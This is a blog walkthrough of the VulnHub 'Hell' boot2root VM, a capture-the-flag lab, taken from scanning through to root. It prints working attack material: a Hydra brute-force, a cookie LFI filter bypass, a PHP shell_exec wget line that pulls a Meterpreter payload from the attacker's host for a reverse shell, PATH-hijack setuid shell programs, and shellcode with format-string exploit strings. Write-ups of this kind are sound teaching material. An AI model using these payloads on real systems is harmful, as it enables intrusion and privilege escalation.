---
author: recrudesce
comments: false
date: 2014-07-17 15:17:18+00:00
layout: post
slug: hell-walkthrough
title: Hell Walkthrough
wordpress_id: 160
categories:
- VM's
tags:
- boot2root
- g0tmi1k
- hacking
- hell
- nmap
- peleus
- vulnhub
---

So, [Peleus](http://netsec.ws) released a vulnerable VM on [VulnHub](http://www.vulnhub.com), also known as a "boot2root", called Hell.

A lot of the techniques in this VM are known to me apart from the very last step. I will go through my thought process for each step and how I managed to go from enumeration to a root shell. 



<blockquote>[@0x42424242](https://twitter.com/0x42424242) Finally rooted your fucking VM :P
> 
> -- Russ Watts (@recrudesce) [July 16, 2014](https://twitter.com/recrudesce/statuses/489505727887978496)</blockquote>



<!-- more -->



* * *





## Scoping the Joint


NMAP - the start of any fulfilling enumeration stage.  I ran a simple NMAP scan against the VM, which returned the following results


``` bash
root@pwk:~# nmap -sS -T4 --script banner 192.168.0.103

Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-17 19:39 BST
Nmap scan report for 192.168.0.103
Host is up (0.00012s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
|_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
80/tcp  open  http
111/tcp open  rpcbind
666/tcp open  doom
|_banner: Welcome to the Admin Panel
MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 5.20 seconds

```


OK, so we have SSH, HTTP and apparently Doom ([yay Doom !](http://www.kongregate.com/games/mike_id/doom-1)) servers running. Based on previous experience, port 666 is more likely to be a service that is hidden behind a well known port. I wont go into the details of port 666 nor the service behind it, but lets say it's a distraction and a diversionary tactic - don't go there unless you want to waste time.  Unless you want to waste time, in which case fire up Netcat and go for your life !

Visting the web server in a browser presents a pretty boring page that welcomes us to the server and shows a cartoon.

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png)

This doesn't give us much to go on, therefore let's try out some simple things any pentester should try - let's see if a robots.txt file exists.  Well what do you know...

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png)

The /personal/ folder shows a creepy shrine site (this is incidentally the closest I've ever been to the face of a cow)

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png)

Yeah, creepy... The /super_secret_login_path_muhahaha/ folder presents a login page

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png)



* * *





## Getting In


It is assumed the username is either **admin** or **jack**, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let's think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per [netsec.ws](http://netsec.ws/?p=457)


``` bash
root@pwk:~# cewl http://192.168.0.103/personal/ -d 1 -m 6 -w password_list.txt -v
CeWL 5.0 Robin Wood (robin@digininja.org) (www.digininja.org)

Starting at http://192.168.0.103/personal/
Visiting: http://192.168.0.103/personal/, got response code 200
Attribute text found:

Words found

root@pwk:~# john --wordlist=password_list.txt --rules --stdout > password_list-mutated.txt
words: 4251  time: 0:00:00:00 DONE (Thu Jul 17 20:08:13 2014)  w/s: 47233  current: forever99
```


Now we have a password list, we can use hydra to brute force the login.


``` bash
root@pwk:~# hydra 192.168.0.103 http-form-post "/super_secret_login_path_muhahaha/login.php:username=^USER^&password=^PASS^:Login Failed" -l jack -P password_list-mutated.txt -t 20 -w 1 -o hydra-http-post-attack.txt
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

[WARNING] the waittime you set is low, this can result in errornous results
Hydra (http://www.thc.org/thc-hydra) starting at 2014-07-17 20:10:12
[DATA] 20 tasks, 1 server, 4251 login tries (l:1/p:4251), ~212 tries per task
[DATA] attacking service http-post-form on port 80
[80][www-form] host: 192.168.0.103   login: jack   password: g0tmi1k69
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-07-17 20:10:22
```


Success, username **jack**, password **g0tmi1k69** (yes, more creepiness, this Jack guy needs locking up). Using these credentials presents us with a management style interface

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png)

I won't explain each section, but the two sections we are going to use are Notes and Personal.
Notes allows us to write arbitrary text to a note.txt file stored in "temporary storage", which is assumed to be /tmp as this is usually what people define as temporary storage.

[![hell_009](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png)

Personal presents another login page, which sets a cookie which has an attribute that increases with each failed login.

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png)

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png)

When you hit 3 failed logins, the page reverts to the main panel, and adds an error message to the top.

[![hell_015](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png)

On further investigation, the **intruder** attribute of the cookie is set which defines the file that is included at the top of the panel. I wonder if there's a local file inclusion vulnerability there.  I went about editing the cookie to try and include other files on the filesystem.  After a few minutes of frustration, I worked out that the code was filtering any instance of ../ in the include path - however, being the sneaky person I am, I discovered this can be bypassed by using ....// or ..././ instead.  Here's /etc/passwd included by setting the **intruder** cookie attribute to ....//....//....//....//etc/passwd

[![hell_008](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png)

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png)

It looks like the page parses any code (HTML etc) in the included file, therefore we can poison the note.txt file with PHP via the Notes feature, and include it to execute the code.  First, a PHP based reverse staged Meterpreter is created and hosted on an HTTP server.


``` bash
root@pwk:~# msfpayload php/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=443 R > sneaky.txt
```


As we are using a staged payload, a handler is required, therefore one is set up via Metasploit


``` bash
msf > use multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set lport 443
lport => 443
msf exploit(handler) > set lhost 192.168.0.110
lhost => 192.168.0.110
msf exploit(handler) > run

[*] Started reverse handler on 192.168.0.110:443
[*] Starting the payload handler...
```


Once the failed login cookie is cleared to allow us to get to features again, the following is added to the note.txt file via the Notes feature, which will download our payload from our HTTP server to the /tmp folder on the host


``` bash
<?php echo shell_exec('wget http://192.168.0.110/sneaky.txt -O /tmp/sneaky.txt 2>&1');?>
```


[![hell_011](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png)

Three failed logins are once again performed via the Personal feature to create the cookie, which is modified to include /tmp/note.txt (which includes our download PHP command)

[![hell_012](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png)

When the main panel page is reloaded, our poisoned note.txt file is included, the PHP is parsed and our payload file is downloaded.

[![hell_013](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png)

We're onto something here !  The cookie is edited once again to include /tmp/sneaky.txt and the panel page reloaded to execute stage 1 of our Meterpreter payload, which makes a connection to our waiting handler.

[![hell_014](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png)


``` bash
[*] Sending stage (40551 bytes) to 192.168.0.103
[*] Meterpreter session 1 opened (192.168.0.110:443 -> 192.168.0.103:48153) at 2014-07-17 21:55:37 +0100

meterpreter >
```




Now would be a good time for a party, but there's hacking to do.  Plus I have no cake or balloons.  Or friends. _*whimper*_ ... HACKING !!!




The Metepreter session can be used to get a shell, which doesn't seem to be TTY, but we can fix that with a nifty command thanks to [g0tmi1k](http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) himself (who is presumably hiding from Jack, the creepy so-and-so). The id command shows that we are currently under the context of the www-data user.





``` bash
meterpreter > shell
Process 10279 created.
Channel 0 created.
python -c 'import pty;pty.spawn("/bin/sh")'
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```


BAM ! We've just started the journey.

Catting /etc/passwd gives us a list of users that are potentially useful


``` bash

$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
george:x:1000:1000:george,,,:/home/george:/bin/bash
jack:x:1001:1001::/home/jack:/bin/sh
milk_4_life:x:1002:1002::/home/milk_4_life:/bin/sh
developers:x:1003:1003::/home/developers:/bin/sh
bazza:x:1004:1004::/home/bazza:/bin/sh
oj:x:1005:1005::/home/oj:/bin/sh

```




* * *





## Imagine Jack and Jill, But With Half the Cast Replaced with a Cardboard Cutout of g0tmi1k


Escalating from the www-data user to the jack user is pretty inconsequential. People who write web sites, especially disturbing ones such as this, will usually not bother to create separate accounts for things such as database logins.

A quick grep on the files in /super_secret_login_path_muhahaha/ for the word "password" results in the following


``` bash

$ grep password /var/www/super_secret_login_path_muhahaha/*
index.php:<INPUT name="password" id="password" type="password" value=""/>
login.php:	$password = mysql_escape_string($_POST["password"]);
login.php:	// mysql_connect("127.0.0.1", "Jack", "zgcR6mU6pX") or die ("Server Error"); I'll change this back once development is done. Got sick of typing my password.
login.php:	$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";
personal.php:<INPUT name="password" id="password" type="password" value=""/>

```


Oooh, what do I spy with my little eye ? Could that be Jack's password commented out in login.php ? Let us try this password...


``` bash

$ su jack
Password: zgcR6mU6pX

$ whoami
jack
$
```


Well, that was easy. But then the 2nd hurdle usually is - you kinda get cocky after clearing the first one, that the second one is jumped based on pure thrill. Now we get to trip over on every hurdle between us and the finish line. Get the first aid kit ready, we're going to need it.



* * *





## Got Milk ? Want Any ?


Poking around Jack's home folder is like walking into a public toilet while bursting for a wee - you don't really want to touch anything, but have to else you're going to have problems.

The first thing that draws my eye is the g0tmi1k_pics folder. It's somewhere you know you don't want to go, but seems to have this strange come-hither vibe about it. It's like a car crash... gruesome but you can't help but look. So I did. Now I wish I didn't. Exhibit A, and B, and C.

[![1](http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg)](http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg)

[![2](http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg)](http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg)

[![3](http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg)](http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg)

Yeah...
Jack, you're a strange one, I'll give you that. Hang on, I think I can hear the men in white coats knocking. Yup, they're asking for you - shall I tell them you're "out" ?

So, while Jack might reuse passwords, he's sensible enough to use PGP when sending emails. /var/mail/jack/received contains an email, which is encrypted.

[plain]
-----BEGIN PGP MESSAGE-----
Version: BCPG C# v1.6.1.0

hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
=svWU
-----END PGP MESSAGE-----
```


As suspected, Jack uses PGP on the local host, therefore his PGP keys are stored in /home/jack/.pgp, complete with a note giving us a password hint.


``` bash

$ ls -l .pgp
ls -l .pgp
total 12
-rwx------ 1 jack jack   39 Jun 18 12:35 note
-rwx------ 1 jack jack 1802 Jun 18 12:20 pgp.priv
-rwx------ 1 jack jack  890 Jun 18 12:24 pgp.pub
$ cat .pgp/note
The usual password as with everything.
$

```


We can assume the password is either **g0tmi1k69** or **zgcR6mU6pX**. GPG is installed, so the next logical step is to try and decrypt the email using either of these two passwords and Jack's PGP private key.


``` bash

$ gpg --import .pgp/pgp.priv
gpg: key 3F18AB0A: secret key imported
gpg: /home/jack/.gnupg/trustdb.gpg: trustdb created
gpg: key 3F18AB0A: public key "jack@cowlovers.com" imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
$ gpg -o email.txt /var/mail/jack/received/message.eml

You need a passphrase to unlock the secret key for
user: "jack@cowlovers.com"

2048-bit RSA key, ID 3F18AB0A, created 2014-06-18

Enter passphrase: g0tmi1k69
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
      "jack@cowlovers.com"
gpg: WARNING: message was not integrity protected
$ cat email.txt
Ok Jack. I've created the account 'milk_4_life' as per your request. Please stop emailing me about this now or I'm going to talk to HR like we discussed. 

The password is '4J0WWvL5nS'

```


Thank you, Jack, for being a predictable - yet persistent - weirdo. A quick hop and a skip over to the worryingly named milk_4_life account and we can carry on.


``` bash

$ su milk_4_life
Password: 4J0WWvL5nS

$ whoami
milk_4_life
$ 
```




* * *





## I Want to Play a Game, But No Jigsaws, OK ?!


The home folder for milk_4_life is pretty sparse, just a binary called "game". However, it's owned by the george user, and has the suid attribute set.


``` bash
$ ls -l
total 20
---s--x--x 1 george      george      5743 Jun 19 18:24 game
```


Running the binary produces the following output, which doesn't tell us much other than it's "listening". Like a overly intrusive neighbour.


``` bash

$ ./game
I'm listening
```


Netstat isn't available on this VM, so we have to find another way to obtain listening port information. Thankfully ss saves the day and shows the game binary IS actually listening, on port 1337 - h4x !


``` bash

$ ss -lp
State       Recv-Q Send-Q    Local Address:Port    Peer Address:Port
LISTEN      0      50        127.0.0.1:mysql       *:*
LISTEN      0      128       :::sunrpc             :::*
LISTEN      0      128       *:sunrpc              *:*
LISTEN      0      128       :::http               :::*
LISTEN      0      128       :::38035              :::*
LISTEN      0      128       *:35380               *:*
LISTEN      0      128       :::ssh                :::*
LISTEN      0      128       *:ssh                 *:*
LISTEN      0      10        *:1337                *:*
LISTEN      0      20        ::1:smtp              :::*
LISTEN      0      20        127.0.0.1:smtp        *:*
LISTEN      0      10        *:666                 *:*
```


Connecting to the port from another session asks us to type "START" to begin. It's more fun to troll the code, though, by typing something completely different. Did you expect anything less of me ?


``` bash

$ telnet 127.0.0.1 1337
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Type 'START' to begin

banana
No... START. S-T-A-R-T

Connection closed by foreign host.
```


OK, enough messing around, let's see what this game does. Typing START presents us with a high score, and then math questions that only your high school math teacher would ask you infront of the rest of the class. Needless to say I'm not answering any of these correctly !


``` bash

$ telnet 127.0.0.1 1337
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Type 'START' to begin

START
Starting...

You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)

Quick what's... 924 x 541? Umm
Quick what's... 982 x 21? No idea
Quick what's... 194 x 542? Really ?
Quick what's... 679 x 733? WHY WOULD I NEED TO KNOW THIS !?
Quick what's... 960 x 248? I give up.
Quick what's... 718 x 646? THANKS OBAMA !
Quick what's... 162 x 784? ^C
Connection closed by foreign host
```


Being the competitive person I am, I figured it would be fun to try and beat the score. More than 133723 points in 30 seconds means I have to answer 4457 correct answers a second. I can type quickly, but not that quickly. This requires some scripting - Python to the rescue ! This script connects to the game, reads the question, splits it based on " x " to get both numbers, performs the multiplication and sends the answer back. Granted I had some help on with this code - thanks c0ne !


``` python

#!/usr/bin/python
import socket
import re

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('127.0.0.1',1337)) # hardcoded IP address
s.recv(1024)
s.send('START\n') # login procedure
s.recv(110)
while True:
    d = s.recv(200)
    l = re.findall(r"Quick what's... (.*?)\?", d)
    if not l:
        print d
        break
    (a,b) = l[0].split(' x ')
    mul = int(a) * int(b)
    print str(mul)
    s.send(str(mul)+'\n')

print s.recv(1024)
s.close()
```


Running it produces a sense of authority over our robot overlords - I'm gaming the game.


``` bash

$ python gamey3.py
125451
150858
498300
493353
60564
**** SNIP ****
174386
841312
53636
Final Score: 412619

!*!*!*!*! Congratulations, new high score (412619) !*!*!*!*!

I hear the faint sound of chmodding.......
```


![high_score_320x320](http://fourfourfourfour.co/wp-content/uploads/2014/07/high_score_320x320.png)

It seems that the binary performs an action when the highscore is beaten. I'm not sure what it chmods, but I wonder if we can play this game at it's own game and make it run a bogus binary. There's a distinct possibility the code is relying on the PATH environment variable and just calling system("chmod file") rather than using an absolute path.

So, a bogus chmod binary is created using the following source, compiled, placed in /tmp on the VM and made executable (do I need to show you how to do this ? No ? Good. Saves me the typing.)

[c]#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
 setuid( 1000 );
 system("id");
 system( "/bin/sh -i" );
}
```


The path environment variable is modified to make /tmp the first location checked


``` bash
$ PATH=/tmp:$PATH
$ export | grep PATH
export PATH='/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games'

```


So, hopefully, if all goes to plan, when we beat the score it should run our fake chmod binary and drop us to a shell. How about we give it a go ? The game is started, and the Python script is run to beat the score (I'm not going to show you again, just scroll up if you want to see what it looks like).

The score is beaten and we are indeed dropped to a new shell as the george user.


``` bash

$ ./game
I'm listening
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
$

```


![](http://31.media.tumblr.com/tumblr_lwipupOVfN1qh59n0o1_500.gif)



* * *





## Tales from the Crypt, But First I'll Rock You


George has one file in his home folder - a Truecrypt container.  I guess no one has told George that TrueCrypt isn't recommended any more - he should be using something else.  *shakes fist at the NSA*
<!-- more -->

Mounting the TrueCrypt container requires us to know the container password, which we currently don't have.


``` bash

george@hell:~$ truecrypt --mount container.tc 
Enter mount directory [default]: 
Enter password for /home/george/container.tc: 
Enter keyfile [none]: 
Protect hidden volume (if any)? (y=Yes/n=No) [No]: 
No password or keyfile specified.
```


Looking around a bit more, it looks like George has also signed up for RockYou


``` bash

From: admin@rockyou.com
To: super_admin@hell.com
Subject: Account Activation
Date: 13th November 2009

Thanks for signing up for your account. I hope you enjoy our services. 
```


*ka-ching* George's password will be on the leaked RockYou wordlist.  oclHashCat can help us out here, thanks to the ability to use GPU's.  Yes, I'm using a Windows PC for this, sue me.


``` bash

G:\Downloads\oclHashcat-1.21>oclHashcat64.exe -m 6211 -a 0 "g:\downloads\container.tc" g:\Downloads\dictionaries\catted\rockyou.txt

g:\downloads\container.tc:letsyouupdateyourfunnotesandmore

Session.Name...: oclHashcat
Status.........: Cracked
Input.Mode.....: File (g:\Downloads\dictionaries\catted\rockyou.txt)
Hash.Target....: File (g:\downloads\container.tc)
Hash.Type......: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
Time.Started...: Sat Jul 12 23:06:15 2014 (17 secs)
Speed.GPU.#1...:    29889 H/s
Recovered......: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.......: 496641/14343296 (3.46%)
Skipped........: 0/496641 (0.00%)
Rejected.......: 1/496641 (0.00%)
HWMon.GPU.#1...: 97% Util, 56c Temp, 32% Fan

Started: Sat Jul 12 23:06:15 2014
Stopped: Sat Jul 12 23:06:37 2014
```


That didn't take too long now did it ?  But we have the TrueCrypt container password, which makes mounting it a tiny bit easier now.


``` bash

george@hell:~$ truecrypt --mount container.tc 
Enter mount directory [default]: ./tc
Enter password for /home/george/container.tc: letsyouupdateyourfunnotesandmore
Enter keyfile [none]: 
Protect hidden volume (if any)? (y=Yes/n=No) [No]: 

george@hell:~$ cd tc
george@hell:~/tc$ ls -l
total 2
-rwx------ 1 george george 1679 Jul  5 20:01 id_rsa
george@hell:~/tc$ 
```


Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.


``` bash

george@hell:~/tc$ ssh bazza@127.0.0.1 -i ./id_rsa 
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul 13 21:18:28 2014 from 192.168.0.102
$ whoami
bazza
```


Oh... I was expecting a bit more of a fight, but I guess Bazza trusts George, even though he uses defunct software that allows privilege escalation (look it up).  Fool. 



* * *





## Bazza's Blockade



Once again we're presented with 2 binaries, with SUID attributes set.  This time, however, we can read the files, which means we can decompile them.  Time to take a look

[c]int __cdecl main()
{
  int result; // eax@6
  _BYTE v1[3]; // [sp+19h] [bp-417h]@3
  FILE *v2; // [sp+424h] [bp-Ch]@1
  const char *v3; // [sp+428h] [bp-8h]@1
  const char *v4; // [sp+42Ch] [bp-4h]@1

  v4 = "900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2\n";
  v3 = "1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id\n";
  printf("Checking integrity of part2...");
  v2 = popen("sha256sum /home/bazza/part2", "r");
  if ( !v2 )
    puts("Failed to run command");
  fgets(v1, 1034, v2);
  if ( strcmp(v1, v4) )
  {
    puts("Uh oh.... Corrupted or in wrong directory (/home/bazza/)\n");
    result = 0;
  }
  else
  {
    puts(" Done!!\n");
    printf("Checking integrity of calling target...");
    v2 = popen("sha256sum /usr/bin/id", "r");
    if ( !v2 )
      puts("Failed to run command");
    fgets(v1, 1034, v2);
    if ( strcmp(v1, v3) )
    {
      puts("Target corrupt\n");
      result = 0;
    }
    else
    {
      puts(" Done!!\n\nBinary and target confirmed.");
      system("/home/bazza/part2");
      pclose(v2);
      result = 0;
    }
  }
  return result;
}
```


OK, so part1 runs part2 (this time with an absolute path), so time for a quick peek into part2

[c]int __cdecl main()
{
  __gid_t v0; // eax@2
  int result; // eax@2

  if ( getegid() == 1003 )
  {
    puts("\nCan't touch this *nah na na na na naaaaaaaa nah*");
    system("id");
    result = 0;
  }
  else
  {
    v0 = getegid();
    printf("\n\nError! %d ID detected ... you're not allowed to run this, please use part 1!\n", v0);
    result = 0;
  }
  return result;
}
```


So, part2 will run only if the effective group identifier is 1003.  part1 has a SUID attribute set as group developers, which means you have to run part1 before part2.  If you run part2 first, this happens


``` bash

Error! 1004 ID detected ... you're not allowed to run this, please use part 1!
```


Running part1 changes our effective group identifier, and part2 changes our effective user identifier, but doesn't seem to drop us to a shell as that user (oj)


``` bash

$ ./part1
Checking integrity of part2... Done!!

Checking integrity of calling target... Done!!

Binary and target confirmed.

Can't touch this *nah na na na na naaaaaaaa nah*
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
$ whoami
bazza
```


A further look into the source code for part2 shows that it is not using an absolute path for the system("id") function, therefore we can trick this application into running a bogus id binary in the same way we did with the bogus chmod binary.  The source code is pretty much the same, apart from the fact I'm using uid 1005 rather than 1000.

[c]#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
 setuid( 1005 );
 system("/usr/bin/id");
 system( "/bin/sh -i" );
}
```


This is compiled, placed in /tmp and made executable.  The path environment variable is modified as per last time and we're good to go.


``` bash

$ ./part1
Checking integrity of part2... Done!!

Checking integrity of calling target... Done!!

Binary and target confirmed.

Can't touch this *nah na na na na naaaaaaaa nah*
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
$ whoami
oj

```


Success !

Nearly there, only this hoop to jump through and we're done.



* * *





## Orange Juice Doesn't Echo


The OJ user has 1 file, a binary called echo which does exactly that, it repeats what you send it. This guy is the height of programming ability. There's got to be something wrong with it.
<!-- more -->

A quick look at the binary in IDA, and yes there is something wrong with it, there seems to be something in it that is called a "format string vulnerability".

![](https://pmpaspeakingofprecision.files.wordpress.com/2014/07/confused-child.jpg)

wut ?

What felt like 12 days of reading, and video watching (Fuzzy Security videos are the best - check [this one out for formatstr vuln explanation](https://www.youtube.com/watch?v=NwzmYSlETI8) and the [follow up](https://www.youtube.com/watch?v=CHrs30g-3O0)) I still felt none the wiser.  But I figured I'd give it a go anyway.  What's the worst that can happen ?  I can't make it any more wrong now can I ?

Meh, let's put our shellcode (setuid plus /bin/sh) into memory anyway, just so it looks like we're progressing.


``` bash
export SHELLCODE=$(python -c 'print "\x90" * 1000 + "\x89\xe7\xda\xc3\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x75\x61\x4b\x6b\x51\x7a\x42\x37\x56\x38\x68\x4d\x6d\x50\x43\x5a\x64\x4b\x33\x68\x6a\x39\x36\x32\x35\x36\x51\x78\x44\x6d\x61\x73\x6e\x69\x79\x77\x33\x58\x34\x6f\x31\x63\x32\x48\x73\x30\x43\x58\x54\x6f\x53\x52\x51\x79\x62\x4e\x6f\x79\x7a\x43\x43\x62\x38\x68\x77\x78\x63\x30\x43\x30\x55\x50\x36\x4f\x50\x62\x51\x79\x52\x4e\x66\x4f\x42\x53\x30\x68\x55\x50\x46\x37\x53\x63\x6d\x59\x49\x71\x7a\x6d\x4f\x70\x41\x41"')
```


So, I started to play around with gdb and format strings.
There are several ways you can do format string vulnerabilities - you can put your shellcode in memory using an environment variable, then overwrite a global offset table entry to execute your code (as per the videos), or if you're unlucky like me and have a statically linked binary, you have to find another way such as jumping to a location in the stack. I tried that... it didn't work because my shellcode kept moving in memory.

![](http://media.tumblr.com/201153f420ed4a2ca50fadbcfabacce3/tumblr_inline_n1mltcP4Bf1ss9nq4.gif)

Apparently, though, you can overwrite entries in the .dtor part of the binary - don't ask me what .dtor is, but I had great fun gradually overwriting random memory locations and crashing the application over and over and over again... 

Here are some of the format strings I fabricated while on my journey - you can get an idea of my thought pattern and the things I tested.  It's also pretty obvious when I went back to basics about 7 attempts in.

[plain]
$(python -c 'print "\x5c\xf8\xff\xbf"')-%64362u-%116\$n
$(python -c 'print "AAAA"')-%64362u-%117\$n.
$(python -c 'print "\x14\x96\x0c\x08"')%64362u-%119\$n.
$(python -c 'print "\x5c\xf8\xff\xbf" + "\x5e\xf8\xff\xbf"')-%64362u-%4\$n-%5\$n
$(python -c 'print "\x5c\xf8\xff\xbf"')-%116\$n.
$(python -c 'print "AAAA"')%117\$x
%64364u$(python -c 'print "\x14\x96\x0c\x08"')%119\$n.
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AAABBBB%49136u%120\$hn%15217u%119\$hn
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AABB-%00001c%116\$.x%00001c%114\$.x
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AABBBB%49134u%113\$hn%15217c%112\$hn
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AABBBB%49134u%118\$hn%15217u%117\$hn
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AAAB%49139u%118\$hn%15217c%117\$hn
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AAABBBB%49136u%120\$hn%15217c%119\$hn

```


I spent a lot of time staring at segfault after segfault until I stumbled upon this random combination of characters (I really really want to explain how I worked it out, but I'm not 100% sure myself. I guess that's a follow up post sometime. Also, it is possible this wont work for you).

[plain]
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AAAB%49139u%118\$hn%15217c%117\$hn
```


Which when executed like this


``` bash

$ /home/oj/echo $(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AAAB%49139u%118\$hn%15217c%117\$hn
```


dropped me to a shell.


``` bash

# id 
uid=0(root) gid=1005(oj) groups=0(root),1005(oj) 
# whoami 
root 
# cat /root/flag.txt 
Congratulations of beating Hell. 

I hope you enjoyed it and there weren't to many trolls in here for you. 

Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242 

Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de 


# 
```


